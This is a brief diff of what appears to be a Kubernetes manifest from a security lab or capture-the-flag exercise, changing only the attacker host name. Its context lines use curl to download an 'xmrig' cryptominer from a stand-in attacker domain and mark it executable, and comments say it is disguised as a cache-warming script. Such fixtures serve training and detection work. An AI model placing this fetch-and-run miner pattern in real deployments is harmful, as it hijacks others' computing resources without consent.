@@ -23,7 +23,7 @@ spec:
         apk add --no-cache curl bash
 
         # Download "cache warming script" (actually a cryptominer)
-        curl -o /tmp/warmer http://attacker.ctf.local/xmrig
+        curl -o /tmp/warmer http://attacker.sc.local/xmrig
         chmod +x /tmp/warmer
 
         # Run the "cache warmer" (actually mining cryptocurrency)
